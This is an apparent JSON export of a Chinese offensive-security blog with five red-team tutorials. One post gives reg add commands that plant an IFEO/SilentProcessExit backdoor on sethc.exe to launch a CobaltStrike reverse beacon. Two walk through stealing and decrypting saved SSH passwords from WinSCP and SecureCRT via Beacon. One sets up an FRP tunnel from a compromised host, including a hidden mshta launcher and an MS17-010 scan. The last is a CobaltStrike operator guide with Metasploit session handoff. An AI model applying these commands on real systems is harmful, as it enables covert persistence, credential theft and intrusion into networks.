{"meta":{"title":"AnonySec'Blog","subtitle":"","description":"","author":"AnonySec","url":"https://payloads.cn","root":"/"},"pages":[{"title":"分类","date":"2019-12-04T13:50:02.023Z","updated":"2019-12-04T13:50:02.014Z","comments":false,"path":"categories/index.html","permalink":"https://payloads.cn/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T14:55:21.787Z","updated":"2019-12-04T13:50:11.945Z","comments":false,"path":"tags/index.html","permalink":"https://payloads.cn/tags/index.html","excerpt":"","text":""},{"title":"关于","date":"2019-12-05T15:41:39.176Z","updated":"2019-12-04T15:43:19.905Z","comments":false,"path":"about/index.html","permalink":"https://payloads.cn/about/index.html","excerpt":"","text":"1ID：AnonySec2不甘在奋斗的年纪选择安逸，记录这一路的学习与生活。3———— Hang&#39;Day42019.12.5 凌晨"}],"posts":[{"title":"Shfit映像劫持后门之新玩法","slug":"Shfit映像劫持后门新玩法","date":"2019-12-05T05:08:11.000Z","updated":"2019-12-06T00:22:16.415Z","comments":true,"path":"2019/1205/shfits-new-way-to-hijack-the-backdoor.html","link":"","permalink":"https://payloads.cn/2019/1205/shfits-new-way-to-hijack-the-backdoor.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn映像劫持简介映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。简单测试映像劫持技术的利用，存在已久，这里再简单说明下：在修改注册HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\\windows\\system32\\cmd.exe之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。映像劫持后门新玩法实现效果键入五下Shift执行时，先执行sethc.exe程序，当sethc.exe程序静默退出时，执行CobaltStrike的Powershell，反弹Beacon shell 。简单来说就是：程序A静默退出结束后，会执行程序B。GFlages测试文章地址：https://blogs.msdn.microsoft.com/junfeng/2004/04/28/image-file-execution-options/下载gflags.exehttps://docs.microsoft.com/zh-cn/previous-versions/msdn10/gg463016(v=msdn.10)根据微软的官方文档描述，在Silent Process Exit选项卡中的配置，都保存在注册表中。GFlags工具自动添加并修改了“IFEO”目录下sethc.exe的GlobalFlag值。以及SilentProcessExit下ReportingMode和MonitorProcess两个值。这时测试会发现，当键入五下Shift时，先执行sethc.exe程序，当sethc.exe程序静默退出时，便会执行cmd.exe程序。这么一来，可以直接在命令行中对注册表进行设置。（需要管理员权限）1reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /f2reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v GlobalFlag /t REG_DWORD /d 512 /f3reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v ReportingMode /t REG_DWORD /d 1 /f4reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\sethc.exe\" /v MonitorProcess /t REG_SZ /d \"c:\\windows\\system32\\cmd.exe\" /f简单解释一下ReportingMode和MonitorProcess 这两个项值的作用。MonitorProcess的值表示监视器进程。Reporting Mode可以设置为三个值 。FlagValue解释LAUNCH_MONITORPROCESS0x1检测到进程静默退出时，将会启动监视器进程（在GFLAGS.exe中，Silent Process Exit这个选项卡所填写的值，即MonitorProcess的项值）LOCAL_DUMP0x2检测到进程静默退出时，将会为受监视的进程创建转储文件NOTIFICATION0x4检查到进程静默退出时，将会弹出一个通知与CobaltStrike结合利用换位思考，用上述的方法，修改MonitorProcess值放入CobaltStrike的powershell。这样，可以在渗透中做到权限的维持，按五下Shift就可以隐蔽进行反连。实测，Windows锁屏，键入五下Shift后正常弹粘滞键，关闭之后执行powershell代码，反弹beacon的shell。","categories":[{"name":"权限维持","slug":"权限维持","permalink":"https://payloads.cn/categories/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]},{"title":"解密Winscp客户端中保存的密码hash","slug":"解密Winscp客户端中保存的密码hash","date":"2019-12-04T14:08:50.000Z","updated":"2019-12-05T15:07:20.962Z","comments":true,"path":"2019/1204/decrypt-password-hash-saved-in-winscp-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-password-hash-saved-in-winscp-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言WinSCP是一个Windows环境下使用的SSH的开源图形化SFTP客户端。同时支持SCP协议。它的主要功能是在本地与远程计算机间安全地复制文件，并且可以直接编辑文件。而我们的主要目的是为了读取里面各种的SSH连接密码。所有操作全部在管理员权限下进行最新版Winscp为例通过powershell脚本搞定，或者RDP直接登录连接查询等。 「绿色版无安装记录」1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-list前提，目标得事先保存连接密码。确定Winscp存储位置默认情况下，Winscp配置会存储在Windows对应的注册表项下（包括了连接的IP、用户名、密码Hash）。HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\具体解密过程查看Winscp配置的Windows注册表（注册表项是固定的），如果有连接会话，再指定查询连接下所保存的密码Hash。1beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions&quot;2beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\\Software\\Martin Prikryl\\WinSCP 2\\Sessions\\root@192.168.144.128&quot;将查到的信息拷贝到本地的winscppwd.exe进行解密。RDP直接登录目标，导出Winscp配置文件，并下载到本地进行解密。(如果找到配置的ini文件，直接把对应文件down本地进行解密即可)附脚本工具ListInstalledPrograms.ps1winscppwd.exe","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"解密SecureCRT客户端中保存的密码hash","slug":"解密SecureCRT客户端中保存的密码hash","date":"2019-12-04T14:08:30.000Z","updated":"2019-12-05T15:07:28.643Z","comments":true,"path":"2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","link":"","permalink":"https://payloads.cn/2019/1204/decrypt-the-password-hash-stored-in-securecrt-client.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言SecureCRT是运维人员常用的管理工具。但由于某些运维人员的安全意识不高，平时很可能会把SSH的连接密码都保存在里面，这就给了渗透人员可乘之机，为后续跨平台横向移动做了准备。而我们的主要目的是为了解密保存在SecureCRT中的这些SHH连接密码，并通过这种方式实现Windows到Linux之间的快速横向渗透。所有操作全部在管理员权限下进行，解密脚本仅限于 SecureCRT 7.x 以下版本，高版本需要使用文章末的方法。如果SecureCRT有启动密码，Config加密了，就不要搞了。确定目标SecureCRT的详细版本想办法确定SecureCRT的详细版本，通过powershell脚本搞定，或者直接RDP登录连接查询等 「绿色版无安装记录」。发现目标所用的详细版本为 7.1.1（build 264）。1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;ListInstalledPrograms.ps12beacon&gt; powershell Get-list确定SecureCRT配置文件目录下的Sessions目录默认情况下，SecureCRT的Config目录路径为：%APPDATA%\\VanDyke\\Config\\Sessions\\如果无法确定路径，可以通过图形界面在SecureCRT菜单的全局选项中来确认。Sessions目录下的每个ini文件都会以连接的IP或域名来命名。1beacon&gt;shell dir %APPDATA%\\VanDyke\\Config\\Sessions\\拷贝下载Sessions目录的ini文件直接到Sessions目录下载ini文件可能会有问题（应该程序占用），即使下载下来，到本地可能无法解密。所以，先用Invoke-NinjaCopy.ps1脚本把ini文件先copy到其他目录，然后再去下载。1beacon&gt; powershell-import &#x2F;Users&#x2F;anonysec&#x2F;Invoke-NinjaCopy.ps12beacon&gt; powershell Invoke-NinjaCopy -Path &quot;C:\\Users\\r00t\\AppData\\Roaming\\VanDyke\\Config\\Sessions\\192.168.144.128.ini&quot; -LocalDestination &quot;c:\\windows\\temp\\192.168.144.128.ini&quot;3beacon&gt; shell dir c:\\windows\\temp\\192.168.144.128.ini 4beacon&gt; download c:\\windows\\temp\\192.168.144.128.ini脚本解密Session将下载的ini文件拷贝到本地，利用脚本进行解密。环境：python 2.7、pycrypto库。此处解密脚本仅限于 SecureCRT 7.x 以下的版本！1sudo pip2 install pycrypto1python SecureCRT-decryptpass.py 192.168.144.128.iniSecureCRT高版本解决如果目标的SecureCRT版本较高，无法进行解密该怎么办？此处以 8.5.3（X64 build 1867）为例，直接把对应%APPDATA%\\VanDyke\\Config\\ 整个目录拷贝到本机SecureCRT的Config目录下，然后直接连接。目标SecureCRT版本与本地版本需一致，否则可能会出现问题。附脚本ListInstalledPrograms.ps1Invoke-NinjaCopy.ps1SecureCRT-decryptpass.py","categories":[{"name":"内网密码搜集","slug":"内网密码搜集","permalink":"https://payloads.cn/categories/%E5%86%85%E7%BD%91%E5%AF%86%E7%A0%81%E6%90%9C%E9%9B%86/"}],"tags":[{"name":"解密客户端","slug":"解密客户端","permalink":"https://payloads.cn/tags/%E8%A7%A3%E5%AF%86%E5%AE%A2%E6%88%B7%E7%AB%AF/"}]},{"title":"Frp内网穿透实战","slug":"Frp内网穿透实战","date":"2019-12-04T14:07:28.000Z","updated":"2019-12-05T15:07:01.085Z","comments":true,"path":"2019/1204/frp-intranet-penetration-combat.html","link":"","permalink":"https://payloads.cn/2019/1204/frp-intranet-penetration-combat.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言实战中，当通过某种方式拿下目标机器权限时，发现该机器可出网。此时为了内网横向渗透与团队间的协同作战，可以利用Frp在该机器与VPS之间建立一条“专属通道”，并借助这条通道达到内网穿透的效果。实战中更多时候依靠 Socks5 。更多详细使用方法，可查看官方Github，这里不再赘述。https://github.com/fatedier/frp/前期准备先准备一台VPS与域名。因某种情况会更换VPS地址，为了减少更改frp配置文件的次数，所以做域名泛解析。若更换VPS，直接编辑域名解析地址即可。下载地址Frp下载地址 [跨平台，实战中根据目标机版本选择下载]https://github.com/fatedier/frp/releases配置文件服务端1#通用配置段2[common]3#frp服务端监听 [VPS]4bind_addr = 0.0.0.05#frp服务器监听端口 [实战中可以用一些通透性较好的端口]6bind_port = 700778#服务端Web控制面板登录端口 [通过控制面板，可以实时了解到数据收发情况。实战中用处不大]9dashboard_port = 660910#服务端Web控制面板用户名与密码 [强口令]11dashboard_user = SuperMan12dashboard_pwd = WC3pvjmh2tt81314#日志输出位置，所有的日志信息都放到当前目录下的frps.log文件中15log_file = ./frps.log16#日志记录等级，有trace、debug、info、warn、error,通常情况下为info17log_level = info 18#日志保留时间19log_max_days = 32021#验证凭据，服务端和客户端的凭据必须一样才能连接22auth_token = E0iQEBOdoJeh23#启用特权模式，从v0.10.0版本开始默认启用特权模式 [特权模式下，客户端更改配置无需更新服务端] 24privilege_mode = true25#特权模式Token [强口令，建议随机生成]26privilege_token = kukezkHC8R1H27#特权模式允许分配的端口 [避免端口被滥用] 28privilege_allow_ports = 4000-500002930#心跳检测超时时长 31heartbeat_timeout = 303233#每个代理可以设置的连接池上限34max_pool_count = 203536#口令认证超时时间，一般不用改37authentication_timeout = 9003839#指定子域名，后续将全部用域名的形式进行访问 [特权模式需下将 *.xxxx.online 解析到外网VPS上，即域名泛解析] 40subdomain_host = xxxx.online客户端1#通用配置段2[common]3#frp服务端IP或域名 [实战中一般都会直接用域名] 4server_addr = frp.xxxx.online5#frp服务器端口6server_port = 700778#授权token，此处必须与服务端保持一致，否则无法建立连接 9auth_token = E0iQEBOdoJeh10#启用特权模式 [特权模式下服务端无需配置] 11privilege_mode = true12#特权模式 token,同样要与服务端完全保持一致 13privilege_token = kukezkHC8R1H1415#心跳检查间隔与超时时间16heartbeat_interval = 10 17heartbeat_timeout = 301819#启用加密 [通信内容加密传输，有效防止流量被拦截]20use_encryption = true21#启用压缩 [传输内容进行压缩，有效减小传输的网络流量，加快流量转发速度，但会额外消耗一些CPU资源]22use_compression = true2324#连接数量 25pool_count = 202627#内网穿透通常用socks528[socks5]29type = tcp30#连接VPS内网穿透的远程连接端口31remote_port = 906632#使用插件socks5代理33plugin = socks534#socks5连接口令 [根据实际情况进行配置]35#plugin_user = SuperMan36#plugin_passwd = ZBO0McQe6mE1执行部署服务端SSH连接到VPS上，后台启动frp服务端。1root@Ubuntu:~# cd tools/frp/2root@Ubuntu:~/tools/frp# nohup ./frps -c frps.ini &amp;3root@Ubuntu:~/tools/frp# jobs -l4root@Ubuntu:~/tools/frp# cat frps.log客户端将frpc.exe与frpc.ini传到目标机的同一目录下，直接运行。当frp客户端启动后，是否成功连接，都会在frp服务端日志中查看到。但如果直接在目标机的Beacon中启动frp客户端，会持续有日志输出，并干扰该pid下的其他操作，所以可结合execute在目标机无输出执行程序。1beacon&gt; sleep 102beacon&gt; execute c:&#x2F;frpc.exe -c c:&#x2F;frpc.ini3beacon&gt; shell netstat -ano |findstr 7007或者，创建后台运行的bat脚本。1@echo off 2if \"%1\" == \"h\" goto begin 3mshta vbscript:createobject(\"wscript.shell\").run(\"%~nx0 h\",0)(window.close)&amp;&amp;exit 4:begin 5c:\\frpc.exe -c c:\\frpc.ini工具穿透Metasploit当“专属通道”打通后，可直接在msf中挂该代理。因为msf的模块较多，所以在内网横向移动中更是一把利器。 [若socks5设置口令，可结合proxychains]1# sudo msfconsole -q2msf5 &gt; setg proxies socks5:frp.xxxx.online:90663msf5 &gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_0104msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 105msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set rhosts 192.168.144.1786msf5 auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; runWindowsWindows中可结合Proxifier、SSTap等工具，可设置socks5口令，以此达到用windows渗透工具横向穿透的效果。小结Frp的用法比较灵活且运行稳定。如 可将frp服务端挂在“肉鸡”上，以达到隐蔽性，也可将客户端做成服务自启的形式等，实战中可自由发挥。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"内网穿透","slug":"内网穿透","permalink":"https://payloads.cn/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}]},{"title":"CobaltStrike基本功能与使用","slug":"CobaltStrike基本功能与使用","date":"2019-12-04T10:47:29.000Z","updated":"2019-12-05T15:07:14.203Z","comments":true,"path":"2019/1204/cobaltstrike-basic-functions-and-use.html","link":"","permalink":"https://payloads.cn/2019/1204/cobaltstrike-basic-functions-and-use.html","excerpt":"","text":"君子藏器于身待时而动，安全不露圭角覆盂之安。——AnonySechttps://payloads.cn前言Cobalt Strike 一款以Metasploit为基础的GUI框架式渗透测试工具，集成了端口转发、服务扫描，自动化溢出，多模式端口监听，exe、powershell木马生成等。钓鱼攻击包括：站点克隆，目标信息获取，java执行，浏览器自动攻击等。Cobalt Strike 主要用于团队作战，可谓是团队渗透神器，能让多个攻击者同时连接到团体服务器上，共享攻击资源与目标信息和sessions。Cobalt Strike 作为一款协同APT工具，针对内网的渗透测试和作为apt的控制终端功能，使其变成众多APT组织的首选。基本功能安装Cobalt Strike 分为客户端和服务端，可分布式操作、协同作战。服务器端只能运行在Linux系统中，可搭建在VPS上。服务端服务端关键的文件是teamserver以及cobaltstrike.jar，将这两个文件放到服务器上同一个目录，然后运行：1chmod +x teamserver2./teamserver 10.11.42.202 test123 3# 服务端真实IP(不能使用0.0.0.0或127.0.0.1)和连接密码客户端客户端在Windows、Linux、Mac下都可以运行 (需要配置好Java环境)。启动Cobalt Strike客户端，输入服务端的IP以及端口、连接密码，用户名可以任意设置。在控制台所有操作指令都会被记录保留在Cobalt Strike目录logs下。参数详情Cobalt Strike1New Connection #新的连接(支持连接多个服务器端)2Preferences #偏好设置(设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录等)3Visualization #窗口视图模式(展示输出结果的形式)4VPN Interfaces #VPN接入5Listenrs #监听器(创建Listener)6Script Manager #脚本管理7Close #关闭View1Applications #应用(显示受害者机器的应用信息)2Credentials #凭证(通过hashdump或Mimikatz抓取过的密码都会储存在这里)3Downloads #下载文件4Event Log #事件日志(主机上线记录以及团队协作聊天记录)5Keystrokes #键盘记录6Proxy Pivots #代理模块7Screenshots #截图8Script Console #脚本控制台(可以加载各种脚本，增强功能https://github.com/rsmudge/cortana-scripts)9Targets #显示目标主机10Web Log #Web日志AttacksPackages1HTML Application #生成恶意的HTA木马文件2MS Office Macro #生成office宏病毒文件3Payload Generator #生成各种语言版本的payload4USB/CD AutoPlay #生成利用自动播放运行的木马文件5Windows Dropper #捆绑器，能够对文档类进行捆绑6Windows Executable #生成可执行Payload7Windows Executable(S) #把包含payload,Stageless生成可执行文件(包含多数功能)Web Drive-by1Manage #对开启的web服务进行管理2Clone Site #克隆网站(可记录受害者提交的数据)3Host File #提供Web以供下载某文件4Scripted Web Delivery #提供Web服务，便于下载和执行PowerShell Payload，类似于Metasploit的web_delivery 5Signed Applet Attack #启动一个Web服务以提供自签名Java Applet的运行环境6Smart Applet Attack #自动检测Java版本并利用已知的exploits绕过security7System Profiler #用来获取一些系统信息，比如系统版本，Flash版本，浏览器版本等Reporting10. Activity report #活动报告21. Hosts report #主机报告32. Indicators of Compromise #威胁报告43. Sessions report #会话报告54. Social engineering report #社会工程学报告65. Tactics, Techniques, and Procedures #策略、技巧和程序 7Reset Data #重置数据8Export Data #导出数据Help1Homepage #官方主页2Support #技术支持3Arsenal #开发者4System information #版本信息5About #关于右键菜单Access1Dump Hashes #获取hash2Elevate #提权3Golden Ticket #生成黄金票据注入当前会话4Make token #凭证转换5Run Mimikatz #运行 Mimikatz 6Spawn As #用其他用户生成Cobalt Strike侦听器Explore1Browser Pivot #劫持目标浏览器进程2Desktop(VNC) #桌面交互3File Browser #文件浏览器4Net View #命令Net View5Port Scan #端口扫描6Process List #进程列表7Screenshot #截图Pivoting1SOCKS Server #代理服务2Listener #反向端口转发3Deploy VPN #部署VPNSpawn外部监听器(如指派给MSF，获取meterpreter权限)Session1Note #备注2Remove #删除3Sleep #指定被控端休眠时间，默认60秒一次回传，让被控端每10秒来下载一次任务。实际中频率不宜过快,容易被发现。4Exit #退出Interact(打开beacon)1beacon&gt; help23Beacon Commands4===============56Command Description7------- -----------8argue 进程参数欺骗9blockdlls 阻止子进程加载非Microsoft DLL10browserpivot 注入受害者浏览器进程11bypassuac 绕过UAC提升权限12cancel 取消正在进行的下载13cd 切换目录14checkin 强制让被控端回连一次15clear 清除beacon内部的任务队列16connect Connect to a Beacon peer over TCP17covertvpn 部署Covert VPN客户端18cp 复制文件19dcsync 从DC中提取密码哈希20desktop 远程桌面(VNC)21dllinject 反射DLL注入进程22dllload 使用LoadLibrary将DLL加载到进程中23download 下载文件24downloads 列出正在进行的文件下载25drives 列出目标盘符26elevate 使用exp27execute 在目标上执行程序(无输出)28execute-assembly 在目标上内存中执行本地.NET程序29exit 终止beacon会话30getprivs Enable system privileges on current token31getsystem 尝试获取SYSTEM权限32getuid 获取用户ID33hashdump 转储密码哈希值34help 帮助35inject 在注入进程生成会话36jobkill 结束一个后台任务37jobs 列出后台任务38kerberos_ccache_use 从ccache文件中导入票据应用于此会话39kerberos_ticket_purge 清除当前会话的票据40kerberos_ticket_use Apply 从ticket文件中导入票据应用于此会话41keylogger 键盘记录42kill 结束进程43link Connect to a Beacon peer over a named pipe44logonpasswords 使用mimikatz转储凭据和哈希值45ls 列出文件46make_token 创建令牌以传递凭据47mimikatz 运行mimikatz48mkdir 创建一个目录49mode dns 使用DNS A作为通信通道(仅限DNS beacon)50mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon)51mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon)52mode http 使用HTTP作为通信通道53mv 移动文件54net net命令55note 备注 56portscan 进行端口扫描57powerpick 通过Unmanaged PowerShell执行命令58powershell 通过powershell.exe执行命令59powershell-import 导入powershell脚本60ppid Set parent PID for spawned post-ex jobs61ps 显示进程列表62psexec Use a service to spawn a session on a host63psexec_psh Use PowerShell to spawn a session on a host64psinject 在特定进程中执行PowerShell命令65pth 使用Mimikatz进行传递哈希66pwd 当前目录位置67reg Query the registry68rev2self 恢复原始令牌69rm 删除文件或文件夹70rportfwd 端口转发71run 在目标上执行程序(返回输出)72runas 以其他用户权限执行程序73runasadmin 在高权限下执行程序74runu Execute a program under another PID75screenshot 屏幕截图76setenv 设置环境变量77shell 执行cmd命令78shinject 将shellcode注入进程79shspawn 启动一个进程并将shellcode注入其中80sleep 设置睡眠延迟时间81socks 启动SOCKS4代理82socks stop 停止SOCKS483spawn Spawn a session 84spawnas Spawn a session as another user85spawnto Set executable to spawn processes into86spawnu Spawn a session under another PID87ssh 使用ssh连接远程主机88ssh-key 使用密钥连接远程主机89steal_token 从进程中窃取令牌90timestomp 将一个文件的时间戳应用到另一个文件91unlink Disconnect from parent Beacon92upload 上传文件93wdigest 使用mimikatz转储明文凭据94winrm 使用WinRM横向渗透95wmi 使用WMI横向渗透使用Listeners简介在本版本Cobalt Strike 3.14中，提供了如图9种 Listener (监听器)。1windows&#x2F;beacon_dns&#x2F;reverse_dns_txt2windows&#x2F;beacon_dns&#x2F;reverse_http3windows&#x2F;beacon_http&#x2F;reverse_http4windows&#x2F;beacon_https&#x2F;reverse_https5windows&#x2F;beacon_smb&#x2F;bind_pipe6windows&#x2F;beacon_tcp&#x2F;bind_tcp7windows&#x2F;foreign&#x2F;reverse_http8windows&#x2F;foreign&#x2F;reverse_https9windows&#x2F;foreign&#x2F;reverse_tcp (3.13版后增加，支持linuxSSH会话)beacon_xx 系列为Cobalt Strike自身，包括 dns、http、https、smb 四种方式的监听器。foreign 系列为外部监听器，通常与MSF或者Armitage联动。在Cobalt Strike 3.13版本后增加了一个新的 Listeners (windows/beacon_tcp/bind_tcp) ，它支持linuxSSH会话。具体更新内容可以查阅 官网 。创建一个服务首先配置一个监听器选择 Attacks &gt; Packages &gt; Windows Executable上线成功，在 Event Log 处出现上线信息。Beacon右键目标interact来使用Beacon，用它来执行各种命令。在Cobalt Strike中，默认心跳为60s，执行命令的响应很慢，在下载文件时更加明显，所以根据实战环境把时间降低，建议不要太快，否则流量会相对明显。在这里设置sleep 10，同时在beacon中，如果想对目标进行命令管理，需要在前面加上shell，如shell whoami等。与Metasploit进行联动Cobalt Strike → Metasploit当Cobalt Strike获得了一个上线机器，想把这个目标传给Metasploit中的meterpreter，获得一个session进行控制。在Metasploit执行以下命令：1use exploit/multi/handler2set payload windows/meterpreter/reverse_tcp3#不要用x64的payload4set lhost 10.11.42.995set lport 53536run -j之后使用Cobalt Strike创建一个windows/foreign/reverse_tcp的Listener。其中IP为Metasploit的监听地址，端口为Metasploit所监听的端口。然后选中计算机，右键-&gt;Spawn:选择Metasploit的监听器：这个时候可以看到，Metasploit上的监听已经上线，现在可以对meterpreter获得的session进行控制。Metasploit → Cobalt Strike现在已经获得了一个meterpreter的session，把session传给Cobalt Strike。在Cobalt Strike中创建一个监听者，和上一步类似，这里host需要修改为Cobalt Strike客户端IP，创建好之后便监听8099端口，等待着被控机连接。\u0001接下来，把meterpreter获得的session转交给Cobalt Strike，在Metasploit执行以下命令：1meterpreter &gt; background 2use exploit/windows/local/payload_inject 3set payload windows/meterpreter/reverse_http4set lhost 192.168.144.1745set lport 80996set DisablePayloadHandler true 7set session 18run解释一下这些参数。由于Cobalt Strike的监听器我们使用的是：windows/beacon_http/reverse_http所以我们的payload也要使用：payload windows/meterpreter/reverse_http设置本地监听IP和端口：由于监听器是CobaltStrike的，所以要设置成CobaltStrike机器的IP与端口。默认情况下，payload_inject执行之后会在本地产生一个新的handler，由于我们已经有了一个，所以不需要在产生一个，这里我们设置：set DisablePayloadHandler true设置当前的session，执行。此时目标机便已成功从Cobalt Strike上线。Socks 4a 代理如果对目标内网进行渗透，可以通过Beacon内置的Socks功能在VPS上开启代理端口，打通目标内网通道，后续结合 Metasploit、Proxychains、Proxifier 等代理工具继续进行内网穿透的横向移动。总结这里只是简单描述CobaltStrike的用法，其中还有很多功能的使用，需要实际操作中去发现。更核心的地方在于理解CobaltStrike的Beacon在内网中的通信过程，这对于渗透者能否更进一步深入内网起到重要作用，也是神器的价值所在。在渗透过程中，不要仅限于单一模式的思路，根据实际的情况，选择更优的方法来进行下一步的渗透测试。","categories":[{"name":"Tools","slug":"Tools","permalink":"https://payloads.cn/categories/Tools/"}],"tags":[{"name":"CobaltStrike","slug":"CobaltStrike","permalink":"https://payloads.cn/tags/CobaltStrike/"}]}]}